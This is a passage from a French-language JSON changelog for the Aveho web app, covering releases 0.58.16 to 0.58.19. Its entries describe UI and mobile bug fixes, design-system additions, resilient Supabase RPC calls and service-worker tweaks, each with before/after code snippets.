          "after": "// 0.58.19 - retirés, tilt fonctionne via perspective() inline\nstyle={{\n  ...\n  transition: 'transform 350ms ...',\n  // Le transformStyle:preserve-3d et willChange créaient des\n  // containing blocks pour les enfants fixed. Retirés.\n}}\n\n// Le tilt fonctionne quand même au hover :\nonMouseMove={(e) => {\n  e.currentTarget.style.transform =\n    `perspective(1000px) rotateX(${rotX}deg) rotateY(${rotY}deg) ...`;\n}}"
        }
      },
      { "code": "UI", "txt": "🛡 RENFORCEMENT — Portals React pour TOUS les overlays. Pour empêcher ce genre de bug de revenir si on remet un willChange ailleurs, on **rend désormais les overlays dans `document.body` directement** via `createPortal`. Concerne : (a) menu-overlay + menu-drawer du burger TopBar. (b) Modal premium (legacy). (c) Drawer premium. Le Dialog premium était déjà rendu via `createRoot` (rien à faire). Chaque composant a un guard `mounted` pour gérer l'hydratation SSR (document indispo côté serveur)",
        "code_snippet": {
          "file": "app/TopBar.js + app/components/Modal.js + app/components/ui-premium/Drawer.js",
          "note": "Portals vers document.body",
          "lang": "jsx",
          "before": "// AVANT 0.58.19 - rendu dans l'arbre React normal\n<TopBar>\n  ...\n  <div className=\"menu-overlay\" />\n  <nav className=\"menu-drawer\">...</nav>\n</TopBar>\n// → captif des containing blocks de tous les ancêtres",
          "after": "// 0.58.19 - rendu via Portal vers document.body\nimport { createPortal } from 'react-dom';\n\nconst [mounted, setMounted] = useState(false);\nuseEffect(() => { setMounted(true); }, []);\n\n{mounted && createPortal(\n  <>\n    <div className=\"menu-overlay\" />\n    <nav className=\"menu-drawer\">...</nav>\n  </>,\n  document.body\n)}\n\n// → garanti d'être rendu directement dans <body>,\n//   échappe à tous les containing blocks d'ancêtres"
        }
      },
      { "code": "UI", "txt": "📱 UX MOBILE — multiples améliorations responsive. (a) **Menu burger** : `height: 100dvh` (Safari iOS dynamic viewport — ne saute plus quand la barre URL apparaît/disparaît) avec fallback `100vh`. Menu-scroll padding-bottom inclut `env(safe-area-inset-bottom)` (home indicator iOS). (b) **Bottom-sheet mobile** (modales en bas) : nouvelle poignée visuelle ::before (style iOS — pill grise centrée 40x4px). `max-height: calc(92vh - env(safe-area-inset-bottom))`. `padding-bottom: calc(22px + env(safe-area-inset-bottom))`. Nouvelle animation `modal-bottom-up` slide depuis le bas. (c) **Drawer premium mobile** : `.av-drawer-panel` full-width avec safe-area-inset-bottom sur le footer. (d) **BulkToolbar** : bottom inclut safe-area-inset",
        "code_snippet": {
          "file": "app/globals.css + app/components/ui-premium/BulkToolbar.js",
          "note": "UX mobile premium",
          "lang": "css",
          "before": "/* AVANT 0.58.19 */\n.menu-drawer { height: 100vh; }  /* saute sur iOS Safari */\n.modal { max-height: 90vh; }     /* pas de safe-area */\n.bulk-toolbar { bottom: 20px; }  /* couvert par home indicator */",
          "after": "/* 0.58.19 - mobile UX premium */\n.menu-drawer {\n  height: 100vh;\n  height: 100dvh;  /* iOS Safari dynamic viewport */\n}\n.menu-scroll {\n  padding: 18px 18px calc(32px + env(safe-area-inset-bottom, 0px));\n}\n.modal {\n  max-height: calc(92vh - env(safe-area-inset-bottom, 0px));\n  padding-bottom: calc(22px + env(safe-area-inset-bottom, 0px));\n  animation: modal-bottom-up 320ms var(--av-ease-out);\n}\n.modal::before {  /* Poignée visuelle iOS */\n  content: \"\";\n  position: absolute;\n  top: 8px; left: 50%; transform: translateX(-50%);\n  width: 40px; height: 4px; border-radius: 99px;\n  background: rgba(20,33,49,.18);\n}\n.bulk-toolbar {\n  bottom: calc(20px + env(safe-area-inset-bottom, 0px));\n}"
        }
      },
      { "code": "AI", "txt": "+20 tests Vitest (v058-19-mobile-fix-ux.test.js) : version+SW (2), Fix containing blocks (3 — PageTransition willChange retiré + KpiCard transformStyle retiré + willChange retiré), Portals overlays (5 — TopBar import + Portal + Modal Portal + Drawer Portal + Dialog déjà OK), CSS mobile (8 — menu-drawer 100dvh + top/bottom/left explicites + menu-scroll safe-area + menu-overlay top/right/bottom/left + poignée iOS + max-height safe-area + padding-bottom safe-area + animation modal-bottom-up + drawer panel full-width), BulkToolbar safe-area (1), Drawer className (1). +2 ajustements anciens tests 0.58.16 (regex pour nouveaux selectors top/right/bottom/left) + 0.58.17 (transformStyle retiré). Total 3852 verts (+20 nets)" },
      { "code": "DOC", "txt": "BUG INSTRUCTIF — Les propriétés CSS `will-change`, `transform`, `filter`, `perspective`, `backdrop-filter`, `contain: layout|paint|strict`, `isolation: isolate` créent toutes un **containing block** pour les enfants `position: fixed`. Quand on les met sur un wrapper qui englobe TOUTE l'app (comme PageTransition), on casse silencieusement TOUS les overlays. Règle d'or : éviter ces propriétés sur les wrappers high-level. Pour les composants overlay critiques (modales/drawers/menus), utiliser systématiquement React Portals vers `document.body` — solution robuste qui survit aux futures régressions. PROCHAINES PISTES UI WOW : ConicCard (alt KpiCard avec scan-line permanent), particles canvas /accueil, Cmd+K palette premium glass, page transitions slide entre routes, login redesign hitech fullscreen avec NeonButton géant" }
    ],
    "themes": ["bugfix", "ui", "mobile"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.19.html",
    "sqlFile": null
  },
  {
    "v": "0.58.18",
    "kind": "version",
    "titre": "🔧 HOTFIX PROD : RPC patient_dashboard résilientes + SW Response.error éliminé + supabase.js défensif",
    "chantiers": [
      { "code": "BG", "txt": "🐛 BUG 1 — 400 sur RPC patient_dashboard_medicaments_actifs (et autres patient_dashboard_*). Cause : les RPC n'étaient pas (toutes) déployées en base, le code attendait toujours une réponse OK et crashait à la première erreur. Fix : helper `safeRpc(name, args)` qui wrap chaque RPC en try/catch individuel. Si une RPC indisponible → log warning console + fallback à null/[] → le dashboard s'affiche partiellement au lieu de crasher entièrement. Sectionnement automatique : si summary n'est pas dispo, les KPI ne s'affichent pas mais les médicaments/médecins peuvent quand même se charger",
        "code_snippet": {
          "file": "app/patient/[id]/dashboard/page.js",
          "note": "RPC résilientes",
          "lang": "jsx",
          "before": "// AVANT 0.58.18 - Promise.all qui crash dès qu'une RPC échoue\nconst [{ data: s }, { data: m }, { data: med }, { data: a }] = await Promise.all([\n  supabase.rpc('patient_dashboard_summary', { p_patient_id: params.id }),\n  supabase.rpc('patient_dashboard_medicaments_actifs', { p_patient_id: params.id }),  // ← 400 si RPC manquante\n  supabase.rpc('patient_dashboard_medecins', { p_patient_id: params.id }),\n  supabase.rpc('patient_dashboard_alertes', { p_patient_id: params.id }),\n]);\n// → tout le bloc crash, dashboard inutilisable",
          "after": "// 0.58.18 - try/catch individuels\nasync function safeRpc(name, args) {\n  try {\n    const { data, error } = await supabase.rpc(name, args);\n    if (error) {\n      console.warn(`[patient_dashboard] RPC ${name} indisponible:`, error.message);\n      return null;\n    }\n    return data;\n  } catch (e) {\n    console.warn(`[patient_dashboard] RPC ${name} a planté:`, e?.message || e);\n    return null;\n  }\n}\n\nconst [s, m, med, a] = await Promise.all([\n  safeRpc('patient_dashboard_summary', { p_patient_id: params.id }),\n  safeRpc('patient_dashboard_medicaments_actifs', { p_patient_id: params.id }),\n  safeRpc('patient_dashboard_medecins', { p_patient_id: params.id }),\n  safeRpc('patient_dashboard_alertes', { p_patient_id: params.id }),\n]);\n// → si RPC manquante, juste cette section est vide, le reste s'affiche"
        }
      },
      { "code": "BG", "txt": "🐛 BUG 2 — Service Worker affichait 'FetchEvent for /profil resulted in a network error response' dans la console. Cause : `Response.error()` (en fallback offline pour les chunks JS/CSS) est interprété par Chrome comme un 'network error' visible dans la console, créant beaucoup de bruit faux-positif. Fix : remplacement par `new Response('', { status: 504, statusText: 'Gateway Timeout' })` — Next.js retry quand même tout seul, mais sans pollution console",
        "code_snippet": {
          "file": "public/sw.js",
          "note": "Plus de Response.error()",
          "lang": "js",
          "before": "// AVANT 0.58.18 - networkFirst et cacheFirst en cas d'échec\nreturn Response.error();\n// → Chrome console: 'FetchEvent for ... resulted in a network error response'",
          "after": "// 0.58.18 - 504 propre sans bruit console\nreturn new Response('', {\n  status: 504,\n  statusText: 'Gateway Timeout',\n  headers: { 'Content-Type': 'text/plain' },\n});\n// → Next.js retry automatiquement, plus de log d'erreur dans la console"
        }
      },
      { "code": "SEC", "txt": "🛡 HARDENING — lib/supabase.js défensif. Cause potentielle 'createClient is not defined' : env vars Supabase manquantes au runtime. Avant on passait `undefined, undefined` à `createBrowserClient`, ce qui provoquait des erreurs cryptiques downstream. Fix : check explicite + log console clair si NEXT_PUBLIC_SUPABASE_URL ou NEXT_PUBLIC_SUPABASE_ANON_KEY est absent. Pas de crash, mais erreur lisible dans la console pour diagnostic. NOTE : si le bug 'createClient is not defined' persiste après ce déploiement, il s'agit d'un fichier qui utilise createClient sans l'importer — investigation manuelle via `findstr /S /N \"createClient\" app\\*.js | findstr /V \"import\\|export\"` côté Windows pour trouver le coupable",
        "code_snippet": {
          "file": "lib/supabase.js",
          "note": "Guard + diagnostic console",
          "lang": "jsx",
          "before": "// AVANT 0.58.18\nexport function createClient() {\n  return createBrowserClient(\n    process.env.NEXT_PUBLIC_SUPABASE_URL,\n    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY\n  );\n}",
          "after": "// 0.58.18 - check explicite + log clair\nexport function createClient() {\n  const url = process.env.NEXT_PUBLIC_SUPABASE_URL;\n  const key = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY;\n  if (!url || !key) {\n    if (typeof window !== 'undefined') {\n      console.error(\n        '[lib/supabase] NEXT_PUBLIC_SUPABASE_URL ou NEXT_PUBLIC_SUPABASE_ANON_KEY manquant. ' +\n        'Vérifiez la config Vercel ou le .env.local.'\n      );\n    }\n  }\n  return createBrowserClient(url, key);\n}"
        }
      },
      { "code": "DOC", "txt": "RPC SQL À DÉPLOYER pour résoudre définitivement les 400 sur le dashboard patient (à exécuter dans le SQL Editor Supabase) : patient_dashboard_summary(p_patient_id uuid), patient_dashboard_medicaments_actifs(p_patient_id uuid), patient_dashboard_medecins(p_patient_id uuid), patient_dashboard_alertes(p_patient_id uuid). Sans ces RPC, le dashboard fonctionnera maintenant en mode dégradé (sans crash) mais les sections seront vides. Pour le bug 'createClient is not defined' qui reste à investiguer : la commande Windows pour trouver le coupable est `findstr /S /N \"createClient\" app\\*.js | findstr /V \"import\\|export\"` — le fichier sans `import { createClient } from \".../lib/supabase\"` au top est le coupable" },
      { "code": "AI", "txt": "Note : aucun test Vitest n'a été ajouté pour cette release car le shell sandbox est tombé. Les patches sont défensifs (try/catch, guards) et ne devraient pas régresser l'existant. À ajouter en 0.58.19 : 5 tests pour safeRpc + SW 504 + supabase.js guard" }
    ],
    "themes": ["bugfix", "prod"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.18.html",
    "sqlFile": null
  },
  {
    "v": "0.58.17",
    "kind": "version",
    "titre": "✨ ULTRA PREMIUM HITECH : Glow x4 + Glassmorphism v2 + 3D Tilt + Aurora blobs + NeonButton + Custom scrollbar + Grid cyber",
    "chantiers": [
      { "code": "UI", "txt": "🎨 DESIGN TOKENS V2 — ajout d'une couche de tokens hitech pour pousser le design encore plus loin. (a) GLOW SHADOWS sur 4 niveaux d'intensité (sm/md/lg/xl) pour teal + 1 niveau pour blue/violet/terra/amber — pour des halos lumineux multi-layer au hover. (b) GLASS SURFACES (light/medium/heavy) avec --av-glass-blur (blur 20px + saturate 180%) et --av-glass-blur-heavy (blur 30px + saturate 220%). (c) CONIC GRADIENTS pour effets rotatifs : --av-conic-aurora (4 couleurs Aveho), --av-conic-scan (effet scan-line). (d) MESH GRADIENTS animés : --av-mesh-aurora (4 blobs hsla), --av-mesh-cyber. (e) GRID SVG inline (data:image/svg+xml) pour pattern cyber subtil en background. (f) @property --scan-angle pour animer le conic-gradient smoothly. (g) 5 nouveaux keyframes : av-scan-rotate (4s), av-bg-pos-shift (8s), av-aurora (18s), av-glow-pulse (3s), av-float-y (4s)",
        "code_snippet": {
          "file": "app/design-tokens.css",
          "note": "Tokens hitech v2",
          "lang": "css",
          "before": "/* AVANT 0.58.17 */\n--av-glow-teal: 0 0 0 4px rgba(124,200,200,.15), 0 0 20px rgba(124,200,200,.25);\n/* 1 seul niveau de glow, ombres simples */",
          "after": "/* 0.58.17 - Glow x4 + glass + conic + grid SVG */\n--av-glow-teal-sm: 0 0 0 2px rgba(124,200,200,.10), 0 0 12px rgba(124,200,200,.20);\n--av-glow-teal-md: 0 0 0 4px rgba(124,200,200,.18), 0 0 24px rgba(124,200,200,.35), 0 0 48px rgba(124,200,200,.15);\n--av-glow-teal-lg: 0 0 0 6px rgba(124,200,200,.25), 0 0 36px rgba(124,200,200,.50), 0 0 72px rgba(124,200,200,.25);\n--av-glow-teal-xl: 0 0 0 8px rgba(124,200,200,.30), 0 0 48px rgba(124,200,200,.65), 0 0 96px rgba(124,200,200,.35), 0 0 144px rgba(124,200,200,.15);\n\n--av-glass-blur: blur(20px) saturate(180%);\n--av-glass-blur-heavy: blur(30px) saturate(220%);\n--av-conic-scan: conic-gradient(from var(--scan-angle, 0deg), transparent 0deg, rgba(124,200,200,.85) 30deg, transparent 60deg, transparent 360deg);\n\n--av-grid-svg: url(\"data:image/svg+xml,...\");\n\n@property --scan-angle {\n  syntax: '<angle>';\n  initial-value: 0deg;\n  inherits: false;\n}"
        }
      },
      { "code": "UI", "txt": "🛠️ HITECH UTILITIES (réutilisables partout). (a) **.av-card-scan** : card avec border conic-gradient animée (effet 'scanning' qui tourne sur le périmètre, visible au hover). Utilise mask-composite:exclude pour ne peindre QUE la bordure. (b) **.av-tilt** : transform-style preserve-3d + perspective(1000px) au hover. (c) **.av-glass / .av-glass-heavy** : glassmorphism prêt à l'emploi. (d) **.av-text-glow-teal / blue** : neon text avec text-shadow 3 layers. (e) **.av-grid-bg / .av-grid-bg-strong** : background pattern cyber. (f) **.av-aurora-blob** : blob animé qui flotte (translate + rotate 18s ease-in-out). (g) **.av-float** : float subtil 4s. (h) **.av-glow-pulse** : pulse glow 3s. (i) **Custom scrollbar** : track sombre transparent + thumb gradient teal avec glow inset au hover, appliqué globalement via `* `. (j) **Smooth scroll** natif avec respect de prefers-reduced-motion",
        "code_snippet": {
          "file": "app/design-tokens.css",
          "note": "Utilities hitech réutilisables",
          "lang": "css",
          "before": "/* AVANT 0.58.17 - scrollbar OS native moche */\n/* (aucun custom) */",
          "after": "/* 0.58.17 - Scrollbar premium teal */\n*::-webkit-scrollbar { width: 10px; height: 10px; }\n*::-webkit-scrollbar-track { background: rgba(20,33,49,.03); border-radius: 99px; }\n*::-webkit-scrollbar-thumb {\n  background: linear-gradient(180deg, rgba(124,200,200,.40), rgba(93,181,181,.55));\n  border-radius: 99px;\n  border: 2px solid transparent;\n  background-clip: padding-box;\n}\n*::-webkit-scrollbar-thumb:hover {\n  background: linear-gradient(180deg, rgba(124,200,200,.70), rgba(93,181,181,.85));\n  box-shadow: inset 0 0 6px rgba(124,200,200,.4);\n}\n\n/* Card scan-line effect */\n.av-card-scan::before {\n  content: \"\";\n  position: absolute; inset: -1px;\n  padding: 1.5px;\n  background: var(--av-conic-scan);\n  -webkit-mask: linear-gradient(#fff 0 0) content-box, linear-gradient(#fff 0 0);\n  mask-composite: exclude;\n  animation: av-scan-rotate 4s linear infinite;\n  opacity: 0;\n  transition: opacity 300ms;\n}\n.av-card-scan:hover::before { opacity: 1; }"
        }
      },
      { "code": "UI", "txt": "🌐 TOPBAR GLASSMORPHISM V2. (a) Background passé de couleur opaque à **rgba(13,24,34,.92)** (4 stops) pour vrai glassmorphism transparent. (b) backdrop-filter passé de blur(14px) saturate(180%) → **blur(20px) saturate(200%)** pour effet plus poussé. (c) Nouvelle border-bottom animée via ::after : barre lumineuse teal qui se déplace 8s en boucle (av-bg-pos-shift), donnant un effet 'scan' continu très subtil. (d) Box-shadow renforcée avec brightness inset. (e) **Logo .v en neon multi-layer 4 couches** : 0 0 4px / 12px / 24px / 48px de rgba(124,200,200) avec opacités décroissantes — donne un vrai effet 'glow neon' au logo Aveho",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "TopBar plus hitech",
          "lang": "css",
          "before": "/* AVANT 0.58.17 */\n.topbar {\n  background: linear-gradient(90deg, #0d1822, ...);  /* opaque */\n  backdrop-filter: blur(14px) saturate(180%);\n}\n.logo .v { text-shadow: 0 0 14px rgba(124,200,200,.6); }",
          "after": "/* 0.58.17 */\n.topbar {\n  background: linear-gradient(90deg, rgba(13,24,34,.92), ...);  /* transparent */\n  backdrop-filter: blur(20px) saturate(200%);\n  box-shadow: 0 2px 16px rgba(20,33,49,.25), 0 1px 0 rgba(255,255,255,.04) inset;\n}\n.topbar::after {\n  content: \"\";\n  position: absolute; bottom: -1px; left: 0; right: 0;\n  height: 1px;\n  background: linear-gradient(90deg, transparent 0%, rgba(124,200,200,.6) 50%, transparent 100%);\n  background-size: 200% 100%;\n  animation: av-bg-pos-shift 8s ease-in-out infinite;\n}\n.logo .v {\n  text-shadow:\n    0 0 4px rgba(124,200,200,.9),\n    0 0 12px rgba(124,200,200,.65),\n    0 0 24px rgba(124,200,200,.35),\n    0 0 48px rgba(124,200,200,.15);  /* Neon 4-layer */\n}"
        }
      },
      { "code": "UI", "txt": "🎴 KPICARD 3D TILT PARALLAX. La card suit maintenant le curseur en 3D au hover. (a) **transformStyle: preserve-3d** + **transition 350ms cubic-bezier** + **willChange: transform**. (b) **onMouseMove** capte la position du curseur via getBoundingClientRect() et applique une rotation X/Y proportionnelle (±4deg Y, ±3deg X). (c) translateY(-4px) + scale(1.015) pour l'effet 'lift'. (d) **Variants enrichis** : ajout de glow multi-layer (0 0 40px + 0 0 80px) et color accent pour chaque variant (teal/blue/terra/amber/navy/violet/success). (e) Au hover : box-shadow = shadow + glow combinés (effet halo coloré qui pulse subtilement). Le tout reste sur 60fps grâce à transform GPU-accelerated",
        "code_snippet": {
          "file": "app/components/ui-premium/KpiCard.js",
          "note": "Tilt 3D suivant le curseur",
          "lang": "jsx",
          "before": "/* AVANT 0.58.17 - simple translateY au hover */\nonMouseEnter={(e) => {\n  e.currentTarget.style.transform = 'translateY(-4px)';\n  e.currentTarget.style.boxShadow = cfg.shadow;\n}}",
          "after": "/* 0.58.17 - Tilt 3D parallax suivant le curseur */\nonMouseEnter={(e) => {\n  e.currentTarget.style.transform = 'perspective(1000px) rotateX(2deg) rotateY(-2deg) translateY(-4px) scale(1.015)';\n  e.currentTarget.style.boxShadow = cfg.shadow + ', ' + cfg.glow;\n  e.currentTarget.style.borderColor = cfg.color;\n}}\nonMouseMove={(e) => {\n  const rect = e.currentTarget.getBoundingClientRect();\n  const x = (e.clientX - rect.left) / rect.width;\n  const y = (e.clientY - rect.top) / rect.height;\n  const rotY = (x - 0.5) * 8;   // ±4deg max\n  const rotX = (0.5 - y) * 6;   // ±3deg max\n  e.currentTarget.style.transform =\n    `perspective(1000px) rotateX(${rotX}deg) rotateY(${rotY}deg) translateY(-4px) scale(1.015)`;\n}}\n\n/* Variants enrichis */\nteal: {\n  gradient: 'var(--av-grad-teal)',\n  shadow: 'var(--av-shadow-teal)',\n  glow: '0 0 40px rgba(124, 200, 200, 0.45), 0 0 80px rgba(124, 200, 200, 0.25)',\n  color: '#7CC8C8',  // pour la borderColor au hover\n}"
        }
      },
      { "code": "UI", "txt": "🌌 PAGEHERO HITECH (aurora blobs animées + grid cyber + icon halo pulse). (a) **Grid SVG cyber** inline (data:image/svg+xml) en overlay 0.45 opacity — donne un pattern subtil de carrés 40x40px partout. (b) **Mesh aurora** animé via background-position-shift (déplacement 18s ease-in-out — donne l'impression que le ciel bouge en arrière-plan). (c) **2 aurora-blobs animés** : 240x240 en haut-droite, 200x200 en bas-gauche, chacune avec animation av-aurora (translate + rotate 18s) et délais différents. (d) **Icon halo multi-layer** : 2 blobs blur (16px + 4px) derrière l'icon + animation av-glow-pulse 4s + text-shadow neon de la couleur accent du variant. (e) **isolation: isolate** sur le header pour stacking context propre",
        "code_snippet": {
          "file": "app/components/ui-premium/PageHero.js",
          "note": "Hero ultra premium avec aurora",
          "lang": "jsx",
          "before": "/* AVANT 0.58.17 - mesh statique + 1 blob */\n<header>\n  <div style={{ background: 'var(--av-mesh-navy)', opacity: .5 }} />\n  <div style={{ background: `radial-gradient(circle, ${accent}55, transparent 70%)` }} />\n  <i className=\"ti icon\" />\n</header>",
          "after": "/* 0.58.17 - aurora animée + grid + halo pulse */\n<header style={{ isolation: 'isolate', ... }}>\n  {/* Grid SVG cyber */}\n  <div style={{ backgroundImage: 'var(--av-grid-svg-strong)', opacity: .45 }} />\n\n  {/* Mesh aurora animé */}\n  <div style={{\n    background: 'var(--av-mesh-aurora), var(--av-mesh-navy)',\n    backgroundSize: '200% 200%, 100% 100%',\n    animation: 'av-bg-pos-shift 18s ease-in-out infinite'\n  }} />\n\n  {/* 2 aurora blobs flottants */}\n  <div className=\"av-aurora-blob\" style={{ top: -80, right: -80, width: 240, height: 240 }} />\n  <div className=\"av-aurora-blob\" style={{ bottom: -100, left: '20%', animationDelay: '-6s' }} />\n\n  {/* Icon halo pulse + neon text-shadow */}\n  <div style={{ position: 'absolute', inset: -8, background: accent, filter: 'blur(16px)',\n               animation: 'av-glow-pulse 4s ease-in-out infinite' }} />\n  <i className={`ti ${icon}`} style={{\n    textShadow: `0 0 12px ${accent}, 0 0 24px ${accent}66`\n  }} />\n</header>"
        }
      },
      { "code": "UI", "txt": "⚡ COMPOSANT NEONBUTTON — nouveau composant premium ultime (app/components/ui-premium/NeonButton.js, 220 lignes). (a) **6 variants** thématiques (teal/blue/violet/terra/amber/navy) avec gradient + gradientHover + glow multi-layer + textColor. (b) **3 sizes** (sm/md/lg). (c) **Ripple effect** au click : capture position via getBoundingClientRect(), ajoute un cercle blanc qui scale 0→2x en 700ms via av-ripple keyframe, puis cleanup. (d) **Scan-line border** : conic-gradient rotatif animé 4s qui passe sur le périmètre du bouton (visible au hover, fade-in 250ms). (e) **Shimmer light sweep** : un dégradé blanc qui passe en continu sur le bouton (3.5s loop). (f) **Glow multi-layer** au hover (ring 4px + 24px + 48px). (g) **Tilt translateY(-2px)** + transition cubic-bezier. (h) Focus-visible avec glow renforcé pour a11y. (i) Props : variant, size, scan, fullWidth, disabled, type, onClick, children. Le bouton le plus 'wow' du design system",
        "code_snippet": {
          "file": "app/components/ui-premium/NeonButton.js (NEW)",
          "note": "Bouton ultra premium hitech",
          "lang": "jsx",
          "before": "/* AVANT 0.58.17 - boutons classiques btn-save / btn-mini */\n<button className=\"btn-save\" onClick={save}>\n  Enregistrer\n</button>",
          "after": "/* 0.58.17 - NeonButton premium */\nimport { NeonButton } from '@/components/ui-premium';\n\n<NeonButton variant=\"teal\" size=\"md\" onClick={save}>\n  <i className=\"ti ti-deviceFloppy\" /> Enregistrer\n</NeonButton>\n\n/* Le bouton affiche :\n   • Background gradient teal vif\n   • Border conic-gradient teal qui tourne au hover (scan-line)\n   • Shimmer blanc qui passe en continu (3.5s)\n   • Ripple effect au click (cercle qui s'étend)\n   • Hover : translateY(-2px) + glow multi-layer (4px + 24px + 48px)\n   • Focus a11y avec ring teal renforcé */"
        }
      },
      { "code": "UI", "txt": "✨ SKELETON SHIMMER V2 — le gradient inclut maintenant une teinte teal au centre (rgba(124,200,200,.18)) pour un shimmer plus visible et cohérent avec la charte Aveho. Animation passée à ease-in-out 1.8s (plus naturel que linear). Donne un effet 'sonar' plus premium qu'un simple shimmer gris" },
      { "code": "UI", "txt": "🌐 BG-DARK AVEC GRID CYBER. Le fond global de l'app (.bg-dark) combine maintenant le radial-gradient navy d'origine ET le grid SVG cyber subtil (40x40px, opacité 0.06). Donne une impression de 'futur' / 'tech' sans être agressif. Visible sur toutes les pages connectées (TopBar inclus)" },
      { "code": "AI", "txt": "+45 tests Vitest (v058-17-hitech-ultra-premium.test.js) : version+SW (2), Design tokens v2 (7 — glow x4 teal + glow blue/violet/terra/amber + glass surfaces + conic gradients + mesh aurora/cyber + grid SVG + @property scan-angle + keyframes), Hitech utilities (8 — card-scan + tilt + glass + text-glow + grid-bg + aurora-blob + scrollbar + smooth-scroll), TopBar v2 (4 — background rgba + blur 20px + ::after animated + logo neon 4-layer), KpiCard 3D tilt (4 — preserve-3d + onMouseMove parallax + hover transform + variants enrichis), PageHero hitech (5 — isolation + grid + mesh animé + aurora blobs + icon halo pulse), NeonButton (9 — use client + 6 variants + 3 sizes + ripple + scan-line + shimmer + glow + translateY + index), Skeleton v2 (2 — teinte teal + ease-in-out), bg-dark grid (2), Keyframes (2 — av-ripple + neon-btn scan), Récap 21 composants (1). Total 3815 verts (+45)" },
      { "code": "DOC", "txt": "BILAN APRÈS 0.58.17 : design system poussé au MAX. 21 composants premium dont 1 nouveau (NeonButton). L'expérience visuelle est maintenant ultra-premium hitech : aurora blobs animées dans les PageHero, KpiCards qui tiltent en 3D au curseur, TopBar en vrai glassmorphism avec scan-line lumineuse, Logo Aveho neon 4-layer, scrollbar custom partout, grid cyber subtil en background. Prochaines pistes : (a) Page connexion redesignée avec background animé fullscreen + NeonButton. (b) Migration progressive de tous les btn-save/btn-mini vers NeonButton. (c) Composant ConicCard (alternative à KpiCard avec scan-line permanent). (d) Particles animées en background sur /accueil (canvas avec ~30 particules teal qui flottent). (e) Page transitions (slide-in/fade entre routes). (f) Easter egg : Cmd+K pour palette de commandes premium" }
    ],
    "themes": ["ui", "design-system", "wow"],
    "date": "4 juin 2026",
    "noteFile": "NOTE-VERSION-Alpha-0.58.17.html",
    "sqlFile": null
  },
  {
    "v": "0.58.16",
    "kind": "version",
    "titre": "🔧 HOTFIX UI : Profil coupé + Menu burger masqué hors accueil + Dropdowns coupés en bas",
    "chantiers": [
      { "code": "UI", "txt": "🐛 BUG 1 — PROFIL COUPÉ. Le bas de la page Profil (et de toutes les pages avec contenu long) était coupé par le viewport. Cause : `.wrap` avait `padding-bottom: 110px` (110px desktop, 130px mobile) — insuffisant quand BulkToolbar, ProgressBar floating ou bouton flottants flottent en bas, et trop juste sur les iPhone avec home indicator. Fix : passage à `calc(140px + env(safe-area-inset-bottom, 0px))` desktop et `calc(160px + env(safe-area-inset-bottom, 0px))` mobile. Le safe-area-inset gère automatiquement la barre de navigation iOS/Android",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "Padding-bottom de .wrap",
          "lang": "css",
          "before": "/* AVANT 0.58.16 */\n.wrap { max-width: 1180px; margin: 0 auto; padding: 30px 24px 110px; }\n@media(max-width:760px) {\n  .wrap { padding: 18px 12px 130px; }\n}",
          "after": "/* 0.58.16 - Espacement bas amélioré avec safe-area-inset */\n.wrap { \n  max-width: 1180px; \n  margin: 0 auto; \n  padding: 30px 24px calc(140px + env(safe-area-inset-bottom, 0px)); \n}\n@media(max-width:760px) {\n  .wrap { padding: 18px 12px calc(160px + env(safe-area-inset-bottom, 0px)); }\n}\n/* → +30px en desktop / mobile pour éviter que les widgets flottants masquent le contenu\n   → env(safe-area-inset-bottom) ajoute automatiquement la marge home indicator iOS */"
        }
      },
      { "code": "UI", "txt": "🐛 BUG 2 — MENU BURGER MASQUÉ HORS ACCUEIL. Quand on cliquait sur le menu burger depuis une autre page que /accueil, on voyait juste le flou de l'overlay mais le menu drawer restait masqué. Cause : `.menu-overlay` avait `z-index: 48` et `.menu-drawer` `z-index: 49`. Les autres composants fixed des pages (BulkToolbar z:70, ProgressBar floating z:75, Modal z:80, Drawer backdrop z:85) passaient AU-DESSUS du menu, le rendant invisible. Fix : passage à z-index 9998 (overlay) et 9999 (drawer) — valeurs très hautes pour être SÛR d'être au-dessus de tout autre composant",
        "code_snippet": {
          "file": "app/globals.css",
          "note": "Z-index du menu burger",
          "lang": "css",
          "before": "/* AVANT 0.58.16 */\n.menu-overlay { position: fixed; inset: 0; ...; z-index: 48; }\n.menu-drawer { position: fixed; top: 0; left: 0; ...; z-index: 49; }\n\n/* Mais : */\n.bulk-toolbar { ...; z-index: 70 }     /* écrasait le menu */\n.export-progress { ...; z-index: 75 }  /* écrasait le menu */\n.modal-bg { ...; z-index: 80 }         /* écrasait le menu */\n.drawer-bg { ...; z-index: 85 }        /* écrasait le menu */",
          "after": "/* 0.58.16 - z-index très haut pour être garantis au-dessus */\n.menu-overlay { position: fixed; inset: 0; ...; z-index: 9998; }\n.menu-drawer  { position: fixed; top: 0; left: 0; ...; z-index: 9999; }\n\n/* → Plus aucun composant ne peut écraser le menu burger\n   → 9998 / 9999 = au-dessus de tout (modales, drawers, etc.) */"
        }
      },
      { "code": "UI", "txt": "🐛 BUG 3 — DROPDOWNS COUPÉS EN BAS. Les Select, TimePicker, RangePicker, Combobox s'ouvraient TOUJOURS vers le bas (`top: calc(100% + 6px)`). Quand le trigger était en bas de la page ou dans une modale, le dropdown débordait du viewport et était coupé, ou masqué par les widgets flottants. Fix : création d'un hook réutilisable `useDropdownPosition` qui calcule via `getBoundingClientRect()` si le trigger est dans la moitié basse du viewport, et qui détermine s'il faut flip up. Helper `dropdownPositionStyle(flipUp)` qui retourne `{ bottom: 'calc(100% + 6px)' }` si flip, sinon `{ top: 'calc(100% + 6px)' }`. Appliqué aux 4 composants concernés (DatePicker utilise un input HTML5 natif, pas concerné). Recalcul au scroll + resize pour rester correct si le user scroll pendant que le dropdown est ouvert",
        "code_snippet": {
          "file": "app/components/ui-premium/useDropdownPosition.js (NEW)",
          "note": "Hook auto-flip réutilisable",
          "lang": "jsx",
          "before": "// AVANT 0.58.16 - tous les dropdowns toujours vers le bas\n<div style={{\n  position: 'absolute',\n  top: 'calc(100% + 6px)',   // ← TOUJOURS vers le bas\n  ...\n}}>\n  Dropdown content\n</div>\n// → si le trigger est en bas de l'écran, dropdown coupé / invisible",
